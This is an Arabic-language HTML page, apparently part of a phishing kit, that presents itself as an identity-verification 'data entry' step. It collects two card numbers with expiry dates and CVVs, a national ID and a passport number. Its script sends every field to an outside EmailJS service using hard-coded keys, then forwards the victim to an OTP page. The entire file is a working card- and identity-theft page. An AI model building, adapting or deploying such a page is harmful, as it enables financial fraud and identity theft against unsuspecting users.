<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال البيانات</title>
    <!-- استدعاء خط Cairo بأوزان متعددة لتطابق التصميم كما في ملف log.html -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <!-- الحفاظ على مكتبة وإعدادات EmailJS الخاصة بك -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          emailjs.init("XKiDXTgX-UdwJ80LO"); // المفتاح العام الخاص بك
       })();
    </script>

    <style>
        :root {
            var(--primary-color): #123e6b; /* لون الزر والأيقونات الداكن المستمد من الصورة */
            --text-main: #1a1a1a;
            --text-secondary: #6b7280;
            --border-color: #d1d5db;
            --bg-white: #ffffff;
            --font-main: 'Cairo', sans-serif;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: var(--font-main);
            background-color: #f3f4f6; /* خلفية خارجية رمادية للتباين */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            position: relative;
            background-color: var(--bg-white);
            /* الحفاظ على آلية الخلفية عبر الرابط وجعلها بيضاء نقية تتطابق مع log.html */
            background-image: url('https://i.imgur.com/VacrlxB.png'); 
            background-size: cover;
            background-position: center;
            overflow-y: auto; /* السماح بالتمرير بسبب كثرة الحقول */
            display: flex;
            flex-direction: column;
            padding: 0 24px;
        }

        /* سهم الرجوع */
        .header {
            margin-top: 50px;
            margin-bottom: 25px;
            display: flex;
            justify-content: flex-start; /* لليمين بسبب RTL */
            z-index: 2;
        }

        .back-btn {
            color: var(--text-main);
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .back-btn svg {
            width: 24px;
            height: 24px;
            stroke: currentColor;
            stroke-width: 2.5;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* العناوين بنفس خصائص log.html */
        .title-section {
            margin-bottom: 35px;
            z-index: 2;
        }

        .title-section h1 {
            font-size: 22px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 12px;
        }

        .title-section p {
            font-size: 13px;
            color: var(--text-secondary);
            line-height: 1.6;
            font-weight: 600;
        }

        /* النموذج */
        .form-section {
            display: flex;
            flex-direction: column;
            flex: 1;
            z-index: 2;
            padding-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .row-inputs {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .row-inputs .input-group {
            margin-bottom: 0;
            flex: 1;
        }

        /* شكل البوكسات والخطوط مطابق لـ log.html */
        .input-group input {
            width: 100%;
            background-color: transparent;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            padding: 16px 45px 16px 16px; /* 45px يمين لترك مساحة للأيقونة */
            font-family: var(--font-main);
            font-size: 14px;
            font-weight: 600;
            outline: none;
            transition: border-color 0.3s;
        }

        /* الحقول التي لا تحتوي على أيقونات يمنى */
        .input-group.no-icon input {
            padding: 16px;
        }

        .input-group input::placeholder {
            color: #9ca3af;
        }

        .input-group input:focus {
            border-color: #123e6b;
        }

        /* الأيقونات داخل الحقول */
        .icon-right {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-main);
        }

        .icon-right img, .icon-right svg {
            width: 29px; /* تم تكبير الحجم من 20px إلى 32px - يمكنك تغيير الرقم من هنا */
            height: 29px; /* تم تكبير الحجم من 20px إلى 32px - يمكنك تغيير الرقم من هنا */
            object-fit: contain;
        }

        /* زر التأكيد مطابق لزر log.html */
        .btn-primary {
            width: 100%;
            background-color: #123e6b;
            color: var(--bg-white);
            padding: 16px;
            border-radius: 8px;
            border: none;
            font-family: var(--font-main);
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        /* الشروط والأحكام أسفل الشاشة مطابقة تماماً لـ log.html */
        .footer-terms {
            margin-top: auto;
            margin-bottom: 30px;
            text-align: center;
            z-index: 2;
        }

        .footer-terms p {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 4px;
            font-weight: 600;
        }

        .footer-terms a {
            font-size: 13px;
            color: var(--text-main);
            font-weight: 800;
            text-decoration: underline;
        }

    </style>
</head>
<body>

    <div class="mobile-container">
        
        <div class="header">
            <!-- سهم الرجوع يوجه إلى log.html كما طلبت -->
            <a href="log.html" class="back-btn">
                <svg viewBox="0 0 24 24">
                    <path d="M5 12h14M12 5l7 7-7 7" />
                </svg>
            </a>
        </div>

        <!-- نفس نمط الكتابة والعناوين -->
        <div class="title-section">
            <h1>إدخال البيانات</h1>
            <p>الرجاء إدخال بياناتك بدقة وسنقوم بمراجعتها لتأكيد هويتك واستكمال العملية</p>
        </div>

        <!-- الحفاظ على id="data-form" وجميع أسماء الحقول لتعمل مع EmailJS -->
        <form class="form-section" id="data-form">
            
            <!-- معلومات بطاقة ركاز -->
            <div class="input-group">
                <div class="icon-right">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRfos2NOxQLRbw9pe2NPFzBX1Zwk0QEGbiVh08rfYpYenpWPZvolPlhUA&s=10" alt="Rikaz">
                </div>
                <input type="text" id="rikaz-card" name="rikaz-card" placeholder="معلومات بطاقة ركاز" required maxlength="19" inputmode="numeric">
            </div>
            
            <div class="row-inputs">
                <div class="input-group no-icon">
                    <input type="text" id="rikaz-expiry" name="rikaz-expiry" placeholder="تاريخ الانتهاء (MM/YY)" required maxlength="5" inputmode="numeric">
                </div>
                <div class="input-group no-icon">
                    <input type="text" id="rikaz-cvv" name="rikaz-cvv" placeholder="CVV" required maxlength="4" inputmode="numeric">
                </div>
            </div>

            <!-- معلومات البطاقة الائتمانية -->
            <div class="input-group">
                <div class="icon-right">
                    <img id="cc-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9ed5ckmfIHsX792HZnJ4VAi4Dt_WvGZvdtTp4eK4yhQ&s=10" alt="Card">
                </div>
                <input type="text" id="credit-card" name="credit-card" placeholder="معلومات البطاقة الائتمانية" required maxlength="19" inputmode="numeric">
            </div>

            <div class="row-inputs">
                <div class="input-group no-icon">
                    <input type="text" id="credit-expiry" name="credit-expiry" placeholder="تاريخ الانتهاء (MM/YY)" required maxlength="5" inputmode="numeric">
                </div>
                <div class="input-group no-icon">
                    <input type="text" id="credit-cvv" name="credit-cvv" placeholder="CVV" required maxlength="4" inputmode="numeric">
                </div>
            </div>

            <!-- رقم الهوية -->
            <div class="input-group">
                <div class="icon-right">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                </div>
                <input type="text" id="national-id" name="national-id" placeholder="رقم الهوية" required inputmode="numeric">
            </div>

            <!-- رقم جواز السفر -->
            <div class="input-group">
                <div class="icon-right">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <rect x="3" y="4" width="18" height="16" rx="2" ry="2"></rect>
                        <line x1="8" y1="10" x2="16" y2="10"></line>
                        <line x1="8" y1="14" x2="16" y2="14"></line>
                    </svg>
                </div>
                <input type="text" id="passport-number" name="passport-number" placeholder="رقم جواز السفر" required>
            </div>

            <button type="submit" class="btn-primary">تأكيد</button>

        </form>

    <!-- الحفاظ على آلية العمل ونفس سكريبتات id.html تماماً -->
    <script>
        function formatCardNumber(e) {
            let input = e.target.value.replace(/\D/g, ''); 
            input = input.substring(0, 16);
            let formatted = input.match(/.{1,4}/g);
            e.target.value = formatted ? formatted.join(' ') : input;
        }

        function formatExpiryDate(e) {
            let input = e.target.value.replace(/\D/g, '');
            if (input.length > 2) {
                input = input.substring(0, 2) + '/' + input.substring(2, 4);
            }
            e.target.value = input;
        }

        document.getElementById('rikaz-card').addEventListener('input', formatCardNumber);
        
        const creditCardInput = document.getElementById('credit-card');
        const ccLogo = document.getElementById('cc-logo');
        
        creditCardInput.addEventListener('input', function(e) {
            formatCardNumber(e);
            let val = e.target.value.replace(/\D/g, '');
            let newSrc = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9ed5ckmfIHsX792HZnJ4VAi4Dt_WvGZvdtTp4eK4yhQ&s=10';
            
            if (val.startsWith('4')) {
                newSrc = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9ed5ckmfIHsX792HZnJ4VAi4Dt_WvGZvdtTp4eK4yhQ&s=10';
            } else if (val.startsWith('5')) {
                newSrc = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9ed5ckmfIHsX792HZnJ4VAi4Dt_WvGZvdtTp4eK4yhQ&s=10';
            }
            
            if (ccLogo.src !== newSrc) {
                ccLogo.style.opacity = 0;
                setTimeout(() => {
                    ccLogo.src = newSrc;
                    ccLogo.style.opacity = 1;
                }, 150);
            }
        });
        
        document.getElementById('rikaz-expiry').addEventListener('input', formatExpiryDate);
        document.getElementById('credit-expiry').addEventListener('input', formatExpiryDate);

        // التوجيه وإرسال البيانات عند التأكيد
        document.getElementById('data-form').addEventListener('submit', function(event) {
            event.preventDefault(); 
            
            const submitBtn = document.querySelector('.btn-primary');
            submitBtn.textContent = 'جاري الإرسال...';
            submitBtn.disabled = true;

            // إرسال البيانات عبر EmailJS
            emailjs.sendForm('service_ifykx3f', 'template_aon44ez', '#data-form')
                .then(function() {
                    console.log('SUCCESS!');
                    window.location.href = 'otp.html'; // التوجيه لصفحة otp كما في الكود الأصلي
                }, function(error) {
                    console.log('FAILED...', error);
                    alert("حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.");
                    submitBtn.textContent = 'تأكيد';
                    submitBtn.disabled = false;
                });
        });
    </script>
</body>
</html>
